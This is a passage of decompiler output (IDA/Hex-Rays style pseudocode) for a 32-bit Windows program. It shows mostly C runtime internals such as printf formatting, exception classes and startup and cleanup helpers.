//----- (0041010C) --------------------------------------------------------
_DWORD *__thiscall sub_41010C(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 434908: using guessed type void *type_info::`vftable';

//----- (00410611) --------------------------------------------------------
int sub_410611()
{
  return 1;
}

//----- (0041061B) --------------------------------------------------------
void sub_41061B()
{
  InitializeSListHead(&ListHead);
}

//----- (00410648) --------------------------------------------------------
void *sub_410648()
{
  return &unk_509BB0;
}

//----- (0041066B) --------------------------------------------------------
BOOL sub_41066B()
{
  return dword_508720 == 0;
}
// 508720: using guessed type int dword_508720;

//----- (00410677) --------------------------------------------------------
void *sub_410677()
{
  return &unk_50A648;
}

//----- (0041067D) --------------------------------------------------------
void *sub_41067D()
{
  return &unk_50A644;
}

//----- (00410816) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_410816()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00410863) --------------------------------------------------------
void sub_410863()
{
  dword_509BB8 = 0;
}
// 509BB8: using guessed type int dword_509BB8;

//----- (0041086B) --------------------------------------------------------
void sub_41086B()
{
  ;
}
// 41086B: could not find valid save-restore pair for edi
// 41021A: using guessed type _DWORD _guard_check_icall_nop();

//----- (00410896) --------------------------------------------------------
void __cdecl sub_410896()
{
  ;
}
// 410896: could not find valid save-restore pair for edi
// 41021A: using guessed type _DWORD _guard_check_icall_nop();

//----- (0041092B) --------------------------------------------------------
char *__thiscall sub_41092B(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 434918: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00410946) --------------------------------------------------------
_DWORD *__thiscall sub_410946(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 434918: using guessed type void *std::bad_array_new_length::`vftable';

//----- (0041095E) --------------------------------------------------------
void __noreturn sub_41095E()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_40E5E2(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 41095E: using guessed type void __noreturn sub_41095E();
// 41095E: using guessed type _DWORD pExceptionObject[3];

//----- (0041097B) --------------------------------------------------------
void __noreturn sub_41097B()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_410946(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 41097B: using guessed type void __noreturn sub_41097B();
// 41097B: using guessed type _DWORD pExceptionObject[3];

//----- (00413F6C) --------------------------------------------------------
char *__thiscall sub_413F6C(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 434960: using guessed type void *std::bad_exception::`vftable';

//----- (00413F87) --------------------------------------------------------
_DWORD *__thiscall sub_413F87(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return result;
}
// 434960: using guessed type void *std::bad_exception::`vftable';

//----- (0041528A) --------------------------------------------------------
int __cdecl sub_41528A(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1048]; // [esp+6Ch] [ebp-41Ch] BYREF

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_13(&v17, a1, a2, a5, v12, a7);
  v9 = sub_4158E5((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 4156AE: using guessed type _DWORD __stdcall unknown_libname_13(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41528A: using guessed type char var_45C[64];
// 41528A: using guessed type char var_41C[1048];

//----- (004158E5) --------------------------------------------------------
int __thiscall sub_4158E5(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_24(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
LABEL_21:
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_15(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_415A3E((char *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_17(this);
            break;
          case 3:
            v4 = sub_415EA8(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_415AE8(this);
            break;
          case 6:
            v4 = sub_415B10((_BYTE *)this);
            break;
          case 7:
            v4 = sub_415C79(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 4157FB: using guessed type _DWORD __stdcall unknown_libname_15(char, _DWORD);
// 415A01: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 4163E4: using guessed type int __thiscall unknown_libname_24(_DWORD);

//----- (00415A3E) --------------------------------------------------------
char __thiscall sub_415A3E(char *this)
{
  if ( sub_415A5D(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (00415A5D) --------------------------------------------------------
char __thiscall sub_415A5D(char *this)
{
  char result; // al

  result = unknown_libname_18(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 415A87: using guessed type _DWORD __stdcall unknown_libname_18(_DWORD);
// 4163FF: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (00415AE8) --------------------------------------------------------
char __thiscall sub_415AE8(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_16(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 40) = v2;
  if ( v2 < 0 )
    *(_DWORD *)(this + 40) = -1;
  return 1;
}
// 415889: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);

//----- (00415B10) --------------------------------------------------------
char __thiscall sub_415B10(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  char *v4; // edx
  char v5; // al
  _BYTE *v6; // eax

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_415C79((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
  }
  else
  {
    if ( *((_DWORD *)this + 11) )
      goto LABEL_7;
    if ( v1 > 106 )
    {
      switch ( v1 )
      {
        case 'l':
          v6 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v6 == 108 )
          {
            *((_DWORD *)this + 11) = 4;
            *((_DWORD *)this + 4) = v6 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 3;
          }
          break;
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
    }
    else
    {
      switch ( v1 )
      {
        case 'j':
          *((_DWORD *)this + 11) = 5;
          break;
        case 'I':
          v4 = (char *)*((_DWORD *)this + 4);
          v5 = *v4;
          if ( *v4 == 51 && v4[1] == 50 )
          {
            *((_DWORD *)this + 11) = 10;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 54 && v4[1] == 52 )
          {
            *((_DWORD *)this + 11) = 11;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 100 || v5 == 105 || v5 == 111 || v5 == 117 || v5 == 120 || v5 == 88 )
          {
            *((_DWORD *)this + 11) = 9;
          }
          break;
        case 'L':
          *((_DWORD *)this + 11) = 8;
          break;
        case 'T':
          *((_DWORD *)this + 11) = 13;
          break;
        case 'h':
          v3 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v3 == 104 )
          {
            *((_DWORD *)this + 11) = 1;
            *((_DWORD *)this + 4) = v3 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 2;
          }
          break;
      }
    }
  }
  return 1;
}

//----- (00415C79) --------------------------------------------------------
char __thiscall sub_415C79(int this)
{
  char v2; // bl
  int v3; // eax
  char v4; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char v12; // cl
  bool v13; // al
  bool v14; // al
  int v15; // ebx
  char v16; // [esp-4h] [ebp-10h]
  __int16 Src; // [esp+8h] [ebp-4h] BYREF
  char v18; // [esp+Ah] [ebp-2h]

  v2 = 1;
  v3 = *(char *)(this + 49);
  if ( v3 <= 100 )
  {
    if ( v3 != 100 )
    {
      if ( v3 > 88 )
      {
        v6 = v3 - 90;
        if ( !v6 )
        {
          v4 = unknown_libname_19(this);
          goto LABEL_11;
        }
        v7 = v6 - 7;
        if ( !v7 )
          goto LABEL_31;
        if ( v7 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v3 != 88 )
      {
        if ( v3 != 65 )
        {
          if ( v3 != 67 )
          {
            if ( v3 <= 68 )
              return 0;
            if ( v3 > 71 )
            {
              if ( v3 == 83 )
              {
LABEL_10:
                v4 = unknown_libname_23(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v4 = unknown_libname_21(0);
          goto LABEL_11;
        }
LABEL_31:
        v4 = unknown_libname_20(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v4 = sub_41617C((_DWORD *)this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v3 > 112 )
  {
    v8 = v3 - 115;
    if ( !v8 )
      goto LABEL_10;
    v9 = v8 - 2;
    if ( v9 )
    {
      if ( v9 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v3 == 112 )
  {
    v4 = sub_416359((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v3 <= 103 )
    goto LABEL_31;
  switch ( v3 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v4 = sub_41617C((_DWORD *)this, 10, 0);
      break;
    case 'n':
      v4 = unknown_libname_22(this);
      break;
    case 'o':
      v4 = sub_41633A((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v4 )
    return 0;
  if ( *(_BYTE *)(this + 48) )
    return 1;
  v10 = *(_DWORD *)(this + 32);
  Src = 0;
  v11 = 0;
  v18 = 0;
  if ( (v10 & 0x10) != 0 )
  {
    if ( (v10 & 0x40) != 0 )
    {
      LOBYTE(Src) = 45;
LABEL_46:
      v11 = 1;
      goto LABEL_47;
    }
    if ( (v10 & 1) != 0 )
    {
      LOBYTE(Src) = 43;
      goto LABEL_46;
    }
    if ( (v10 & 2) != 0 )
    {
      LOBYTE(Src) = 32;
      goto LABEL_46;
    }
  }
LABEL_47:
  v12 = *(_BYTE *)(this + 49);
  if ( v12 != 120 && v12 != 88 || (v10 & 0x20) == 0 )
    v2 = 0;
  v13 = v12 == 97 || v12 == 65;
  if ( v2 || v13 )
  {
    *((_BYTE *)&Src + v11) = 48;
    v14 = v12 == 88 || v12 == 65;
    *((_BYTE *)&Src + v11 + 1) = !v14 ? 120 : 88;
    v11 += 2;
  }
  v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v11;
  if ( (v10 & 0xC) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  __crt_stdio_output::string_output_adapter<char>::write_string(&Src, v11, this + 24, *(_DWORD *)(this + 12));
  if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      48,
      v15,
      this + 24);
  unknown_libname_25(0);
  if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  return 1;
}
// 4155FF: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 415F2F: using guessed type int __thiscall unknown_libname_19(_DWORD);
// 415F92: using guessed type int __thiscall unknown_libname_20(_DWORD);
// 4160EC: using guessed type _DWORD __stdcall unknown_libname_21(_DWORD);
// 4162C6: using guessed type int __thiscall unknown_libname_22(_DWORD);
// 416371: using guessed type int __thiscall unknown_libname_23(_DWORD);
// 416441: using guessed type _DWORD __stdcall unknown_libname_25(_DWORD);

//----- (00415EA8) --------------------------------------------------------
char __thiscall sub_415EA8(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_16(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 36) = v2;
  if ( v2 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *(_DWORD *)(this + 36) = -*(_DWORD *)(this + 36);
  }
  return 1;
}
// 415889: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);

//----- (0041617C) --------------------------------------------------------
char __thiscall sub_41617C(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v7; // ecx
  __int64 v8; // rax
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax

  v4 = __crt_stdio_output::to_integer_size(this[11]);
  v5 = v4;
  switch ( v4 )
  {
    case 1:
      v13 = this[8];
      this[5] += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int8 *)(v14 - 4);
      else
        LODWORD(v8) = *(char *)(v14 - 4);
      goto LABEL_16;
    case 2:
      v11 = this[8];
      this[5] += 4;
      v10 = (v11 & 0x10) == 0;
      v12 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int16 *)(v12 - 4);
      else
        LODWORD(v8) = *(__int16 *)(v12 - 4);
LABEL_16:
      v8 = (int)v8;
      v7 = v8;
      goto LABEL_17;
    case 4:
      v9 = this[8];
      this[5] += 4;
      v10 = (v9 & 0x10) == 0;
      LODWORD(v8) = this[5];
      if ( v10 )
      {
        v7 = *(_DWORD *)(v8 - 4);
        HIDWORD(v8) = 0;
        goto LABEL_17;
      }
      LODWORD(v8) = *(_DWORD *)(v8 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  this[5] += 8;
  LODWORD(v8) = this[5];
  v7 = *(_DWORD *)(v8 - 8);
  HIDWORD(v8) = *(_DWORD *)(v8 - 4);
LABEL_17:
  if ( (this[8] & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    HIDWORD(v8) = (unsigned __int64)-__SPAIR64__(HIDWORD(v8), v7) >> 32;
    this[8] |= 0x40u;
  }
  if ( (int)this[10] >= 0 )
  {
    this[8] &= ~8u;
    if ( (int)this[10] > 512 )
      this[10] = 512;
  }
  else
  {
    this[10] = 1;
  }
  if ( !__PAIR64__(v7, HIDWORD(v8)) )
    this[8] &= ~0x20u;
  if ( v5 == 8 )
    unknown_libname_11(v7, HIDWORD(v8), a2, a3);
  else
    unknown_libname_10(v7, a2, a3);
  if ( (this[8] & 0x80) != 0 && (!this[14] || *(_BYTE *)this[13] != 48) )
  {
    *(_BYTE *)--this[13] = 48;
    ++this[14];
  }
  return 1;
}
// 415502: using guessed type _DWORD __stdcall unknown_libname_10(_DWORD, _DWORD, char);
// 415577: using guessed type _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD, _DWORD, char);
// 415ED3: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (0041633A) --------------------------------------------------------
char __thiscall sub_41633A(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_41617C(this, 8, 0);
}

//----- (00416359) --------------------------------------------------------
char __thiscall sub_416359(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_41617C(this, 16, 1);
}

//----- (0041657B) --------------------------------------------------------
int __cdecl sub_41657B(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  return sub_41528A(a1, a2, a3, a4, a5, a6, a7);
}

//----- (0041670B) --------------------------------------------------------
int __cdecl sub_41670B(int a1)
{
  return unknown_libname_26(a1);
}
// 41659F: using guessed type _DWORD __stdcall unknown_libname_26(_DWORD);

//----- (00416E0F) --------------------------------------------------------
int __cdecl sub_416E0F(int a1)
{
  int result; // eax

  result = a1;
  dword_509C74 = a1;
  return result;
}
// 509C74: using guessed type int dword_509C74;

//----- (004171D5) --------------------------------------------------------
int sub_4171D5()
{
  return common_flush_all(1);
}
// 4171DE: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (00417D31) --------------------------------------------------------
int __cdecl sub_417D31(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 417CE0: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 417D31: using guessed type int var_8;

//----- (00417FC1) --------------------------------------------------------
int __cdecl sub_417FC1(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 417F70: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 417FC1: using guessed type int var_8;

//----- (0041A34B) --------------------------------------------------------
int sub_41A34B()
{
  return dword_509DCC;
}
// 509DCC: using guessed type int dword_509DCC;

//----- (0041A351) --------------------------------------------------------
int __cdecl sub_41A351(int a1)
{
  int result; // eax

  result = a1;
  dword_509DCC = a1;
  return result;
}
// 509DCC: using guessed type int dword_509DCC;

//----- (0041A379) --------------------------------------------------------
int __cdecl sub_41A379(int a1)
{
  return unknown_libname_26(a1);
}
// 41659F: using guessed type _DWORD __stdcall unknown_libname_26(_DWORD);

//----- (0041A8AD) --------------------------------------------------------
void *__cdecl sub_41A8AD(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_509FF0 )
    return (void *)unknown_libname_30(*a1);
  return result;
}

//----- (0041A8C8) --------------------------------------------------------
void *__cdecl sub_41A8C8(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_509FEC )
    return (void *)unknown_libname_30(*a1);
  return result;
}

//----- (0041AA06) --------------------------------------------------------
int __cdecl sub_41AA06(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_50A424;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 50A424: using guessed type int dword_50A424;

//----- (0041ABBE) --------------------------------------------------------
int __cdecl sub_41ABBE(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 41AB7B: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 41ABBE: using guessed type int var_8;

//----- (0041ABE6) --------------------------------------------------------
void __thiscall sub_41ABE6(_DWORD *this)
{
  void *v2; // esi
  int v3[5]; // [esp+8h] [ebp-14h] BYREF

  v2 = _calloc_base(1u, 0xB8u);
  *(_DWORD *)*this = v2;
  _free_base(0);
  if ( v2 )
  {
    v3[0] = *this;
    v3[1] = this[1];
    v3[2] = this[2];
    v3[3] = this[3];
    v3[4] = this[4];
    sub_41ABBE(4, (int)v3);
  }
}

//----- (0041ADA6) --------------------------------------------------------
__int32 sub_41ADA6()
{
  return _InterlockedExchange(&dword_509FF8, 1);
}
// 509FF8: using guessed type int dword_509FF8;

//----- (0041BCB5) --------------------------------------------------------
int sub_41BCB5()
{
  return dword_509FFC;
}
// 509FFC: using guessed type int dword_509FFC;

//----- (0041BCEA) --------------------------------------------------------
int *sub_41BCEA()
{
  return &dword_50A000;
}
// 50A000: using guessed type int dword_50A000;

//----- (0041BCF0) --------------------------------------------------------
int __cdecl sub_41BCF0(int a1)
{
  return unknown_libname_26(a1);
}
// 41659F: using guessed type _DWORD __stdcall unknown_libname_26(_DWORD);

//----- (0041BE3C) --------------------------------------------------------
int __cdecl sub_41BE3C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 41BDEB: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 41BE3C: using guessed type int var_8;

//----- (0041BE64) --------------------------------------------------------
int __cdecl sub_41BE64(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 41BD9A: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 41BE64: using guessed type int var_8;

//----- (0041C0ED) --------------------------------------------------------
int __cdecl sub_41C0ED(_onexit_t Function)
{
  return _register_onexit_function(&stru_50A008, Function);
}

//----- (0041C181) --------------------------------------------------------
char sub_41C181()
{
  unknown_libname_26(&off_5088A8);
  return 1;
}
// 41659F: using guessed type _DWORD __stdcall unknown_libname_26(_DWORD);
// 5088A8: using guessed type wchar_t *off_5088A8;

//----- (0041C1AD) --------------------------------------------------------
char sub_41C1AD()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 41A8E3: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0041C1F2) --------------------------------------------------------
__vcrt_bool sub_41C1F2()
{
  return __vcrt_uninitialize(0);
}

//----- (0041D13A) --------------------------------------------------------
int __cdecl sub_41D13A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 41D046: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 41D13A: using guessed type int var_8;

//----- (0041D162) --------------------------------------------------------
int __cdecl sub_41D162(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 41CFF6: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 41D162: using guessed type int var_8;

//----- (0041D18A) --------------------------------------------------------
int __cdecl sub_41D18A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
